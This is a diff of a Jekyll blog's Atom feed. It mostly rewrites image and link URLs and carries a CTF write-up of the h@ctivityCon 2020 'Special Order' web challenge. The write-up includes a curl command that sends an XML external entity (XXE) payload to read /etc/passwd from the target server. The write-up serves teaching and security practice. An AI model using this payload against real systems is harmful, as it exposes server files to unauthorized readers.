@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="/blog/" rel="alternate" type="text/html" /><updated>2020-08-01T18:12:52+03:00</updated><id>/blog/feed.xml</id><title type="html">Blog</title><author><name>pop_eax</name><email>pop_eax@localhost.com</email></author><entry><title type="html">thoughts on making CTFs</title><link href="/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/" rel="alternate" type="text/html" title="thoughts on making CTFs" /><published>2020-08-01T15:04:00+03:00</published><updated>2020-08-01T15:04:00+03:00</updated><id>/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder</id><content type="html" xml:base="/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/">&lt;h1 id=&quot;special-order-hctivitycon-ctf-2020&quot;&gt;Special Order h@ctivityCon CTF 2020&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2020-08-01T18:21:18+03:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">Blog</title><author><name>pop_eax</name><email>pop_eax@localhost.com</email></author><entry><title type="html">thoughts on making CTFs</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/" rel="alternate" type="text/html" title="thoughts on making CTFs" /><published>2020-08-01T15:04:00+03:00</published><updated>2020-08-01T15:04:00+03:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/2020/08/01/h-cktivitycon-ctf-specialorder/">&lt;h1 id=&quot;special-order-hctivitycon-ctf-2020&quot;&gt;Special Order h@ctivityCon CTF 2020&lt;/h1&gt;
 
 &lt;p&gt;making a big CTF challenge was always on my todo list, yes I made a couple of CTF challenges before
 but none of them actually made it to such a big event.&lt;/p&gt;
@@ -7,30 +7,37 @@ but none of them actually made it to such a big event.&lt;/p&gt;
 
 &lt;p&gt;accessing the challenge url we get redirected to &lt;code class=&quot;highlighter-rouge&quot;&gt;/login&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/SpecialOrder/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;we see there’s an option to register so we register a user, then login
-&lt;img src=&quot;/images/SpecialOrder/Blog-1.png&quot; alt=&quot;blog&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;we see there’s an option to register so we register a user, then login&lt;/p&gt;
 
-&lt;p&gt;creating a post
-&lt;img src=&quot;/images/SpecialOrder/post-1.png&quot; alt=&quot;post-1&quot; /&gt;
-&lt;img src=&quot;/images/SpecialOrder/post-2.png&quot; alt=&quot;post-2&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/Blog-1.png&quot; alt=&quot;blog&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;creating a post&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-1.png&quot; alt=&quot;post-1&quot; /&gt;
+&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/post-2.png&quot; alt=&quot;post-2&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;also we have the ability to customize how our posts look
-&lt;em&gt;interesting&lt;/em&gt;
-&lt;img src=&quot;/images/SpecialOrder/customize-1.png&quot; alt=&quot;customize-1&quot; /&gt;
-&lt;img src=&quot;/images/SpecialOrder/customize-2.png&quot; alt=&quot;customize-2&quot; /&gt;&lt;/p&gt;
+&lt;br /&gt;&lt;em&gt;interesting&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-1.png&quot; alt=&quot;customize-1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-2.png&quot; alt=&quot;customize-2&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;del&gt;looks ugly ngl&lt;/del&gt;&lt;/p&gt;
 
-&lt;p&gt;from here we can observe that our customization input is getting to the css file
-&lt;img src=&quot;/images/SpecialOrder/css.png&quot; alt=&quot;css&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;from here we can observe that our customization input is getting to the css file&lt;/p&gt;
 
-&lt;p&gt;looking back at the request for customizing the post’s look
-&lt;img src=&quot;/images/SpecialOrder/customize-request.png&quot; alt=&quot;request&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/css.png&quot; alt=&quot;css&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;changing the content-type header we see that the app accepts xml
-&lt;img src=&quot;/images/SpecialOrder/customize-request.png&quot; alt=&quot;curl&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;looking back at the request for customizing the post’s look&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/customize-request.png&quot; alt=&quot;request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;changing the content-type header we see that the app accepts xml&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/curl.png&quot; alt=&quot;curl&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;so let’s send an xxe payload&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;s1&quot;&gt;'http://ip/customize'&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
@@ -39,7 +46,7 @@ but none of them actually made it to such a big event.&lt;/p&gt;
       &lt;span class=&quot;nt&quot;&gt;--data-binary&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [  &amp;lt;!ELEMENT foo ANY &amp;gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;]&amp;gt;&amp;lt;root&amp;gt;&amp;lt;color&amp;gt;&amp;amp;xxe;&amp;lt;/color&amp;gt;&amp;lt;size&amp;gt;20px&amp;lt;/size&amp;gt;&amp;lt;/root&amp;gt;'&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/images/SpecialOrder/passwd.png&quot; alt=&quot;passwd&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/SpecialOrder/passwd.png&quot; alt=&quot;passwd&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;now just read /flag.txt and done :)&lt;/p&gt;
 
@@ -360,7 +367,7 @@ also it was used in multiple CTFs before which got me amazed how really few peop
 
 &lt;p&gt;&lt;strong&gt;&lt;em&gt;wait but what about the math thing in the challenge description?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;it is a second order equation, and the bug is a second order xxe :P&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">Special Order h@ctivityCon CTF 2020</summary></entry><entry><title type="html">The Hacker One writeup</title><link href="/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/" rel="alternate" type="text/html" title="The Hacker One writeup" /><published>2020-07-06T20:40:00+03:00</published><updated>2020-07-06T20:40:00+03:00</updated><id>/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone</id><content type="html" xml:base="/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/">&lt;h1 id=&quot;the-hacker-one&quot;&gt;the hacker one&lt;/h1&gt;
+&lt;p&gt;it is a second order equation, and the bug is a second order xxe :P&lt;/p&gt;</content><author><name>pop_eax</name></author><summary type="html">Special Order h@ctivityCon CTF 2020</summary></entry><entry><title type="html">The Hacker One writeup</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/" rel="alternate" type="text/html" title="The Hacker One writeup" /><published>2020-07-06T20:40:00+03:00</published><updated>2020-07-06T20:40:00+03:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/2020/07/06/dawgctf20-thehackerone/">&lt;h1 id=&quot;the-hacker-one&quot;&gt;the hacker one&lt;/h1&gt;
 
 &lt;p&gt;This challenge was one of the weirdest challenges, I have ever done
 so let’s begin:&lt;/p&gt;
